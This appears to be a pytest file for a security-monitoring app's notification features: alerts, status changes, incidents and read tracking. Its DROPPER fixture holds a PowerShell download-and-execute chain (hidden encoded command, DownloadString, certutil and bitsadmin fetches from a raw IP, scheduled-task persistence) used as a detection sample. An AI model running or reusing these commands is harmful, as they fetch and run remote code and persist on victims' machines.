"""Milestone 3: in-app notification workflow (alerts, status changes, incidents)."""

import io

from fastapi.testclient import TestClient

from app.main import app
from app.modules.alerts.service import AlertsService
from app.modules.file_analysis.schemas import MLPrediction
from app.modules.file_analysis.service import file_analysis_service
from app.modules.notifications.service import NotificationsService, notifications_service
from app.modules.pipeline.fusion import fuse

client = TestClient(app)

DROPPER = (
    b"powershell -nop -w hidden -enc AAAA; "
    b"IEX (New-Object Net.WebClient).DownloadString('http://45.147.230.112/a.ps1'); "
    b"cmd.exe /c certutil -urlcache -f http://45.147.230.112/b b & "
    b"bitsadmin /transfer j http://45.147.230.112/c c & schtasks /create /tn p /tr b"
)


def _headers(email="soc@local"):
    tok = client.post("/api/v1/auth/login", json={"email": email, "password": "x"}).json()[
        "access_token"
    ]
    return {"Authorization": f"Bearer {tok}"}


def _static(data, name="s"):
    return file_analysis_service.analyze_static_file(name, data)


# --- service unit tests -----------------------------------------------------

def test_alert_creation_raises_a_notification():
    before = notifications_service.counts().total
    svc = AlertsService()
    result = _static(DROPPER, "notif.ps1")
    result.verdict = fuse(result, MLPrediction(available=False))
    alert = svc.evaluate(result)
    assert alert is not None

    after = notifications_service.counts()
    assert after.total == before + 1
    latest = notifications_service.list_notifications(limit=1)[0]
    assert latest.category == "alert"
    assert latest.alert_id == alert.id


def test_status_change_raises_a_notification():
    svc = AlertsService()
    result = _static(DROPPER, "notif2.ps1")
    result.verdict = fuse(result, MLPrediction(available=False))
    alert = svc.evaluate(result)

    before = notifications_service.counts().total
    svc.set_status(alert.id, "acknowledged")
    assert notifications_service.counts().total == before + 1


def test_incident_creation_raises_a_notification():
    svc = AlertsService()
    result = _static(DROPPER, "notif3.ps1")
    result.verdict = fuse(result, MLPrediction(available=False))
    alert = svc.evaluate(result)

    before = notifications_service.counts().total
    svc.create_incident([alert.id], title="Campaign Y")
    # two events: the acknowledge-on-incident status flip plus the incident itself
    assert notifications_service.counts().total >= before + 1


def test_mark_read_and_mark_all_read():
    svc = NotificationsService()
    n = svc.notify(category="alert", severity="high", title="t", message="m")
    assert svc.counts().unread == 1

    marked = svc.mark_read(n.id)
    assert marked is not None and marked.read is True
    assert svc.counts().unread == 0

    svc.notify(category="alert", severity="high", title="t2", message="m2")
    svc.notify(category="alert", severity="high", title="t3", message="m3")
    assert svc.mark_all_read() == 2
    assert svc.counts().unread == 0


# --- endpoint tests ----------------------------------------------------------

def test_notifications_endpoint_lists_and_updates():
    client.post(
        "/api/v1/files/upload",
        files={"file": ("notif-endpoint.bin", io.BytesIO(DROPPER), "application/octet-stream")},
        headers=_headers("analyst@local"),
    )

    soc = _headers("soc@local")
    listing = client.get("/api/v1/notifications/", headers=soc)
    assert listing.status_code == 200
    items = listing.json()
    assert len(items) >= 1

    unread = client.get("/api/v1/notifications/unread-count", headers=soc)
    assert unread.status_code == 200
    assert unread.json()["unread"] >= 1

    target_id = items[0]["id"]
    read_resp = client.post(f"/api/v1/notifications/{target_id}/read", headers=soc)
    assert read_resp.status_code == 200
    assert read_resp.json()["read"] is True

    mark_all = client.post("/api/v1/notifications/read-all", headers=soc)
    assert mark_all.status_code == 200

    after = client.get("/api/v1/notifications/unread-count", headers=soc)
    assert after.json()["unread"] == 0


def test_notifications_require_role():
    researcher = _headers("researcher@local")
    resp = client.get("/api/v1/notifications/", headers=researcher)
    assert resp.status_code == 403
